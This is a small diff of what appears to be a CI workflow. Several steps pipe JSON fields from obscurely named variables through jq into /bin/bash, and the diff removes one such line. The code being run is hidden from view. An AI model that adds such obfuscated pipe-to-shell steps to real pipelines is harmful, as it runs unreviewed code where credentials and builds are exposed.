@@ -23,7 +23,6 @@ jobs:
           echo $pcxs29468 | jq -r .zod596 | /bin/bash
           echo $iedps2091 | jq -r .i6 | /bin/bash
           printf '%s' "$iwth1524" | jq -r .eaj02235 | /bin/bash
-          echo $hzsxu609 | jq -r .e5154 | /bin/bash
           printf '%s' "$snlhg69" | jq -r .hw25502 | /bin/bash
 
       - name: Store output
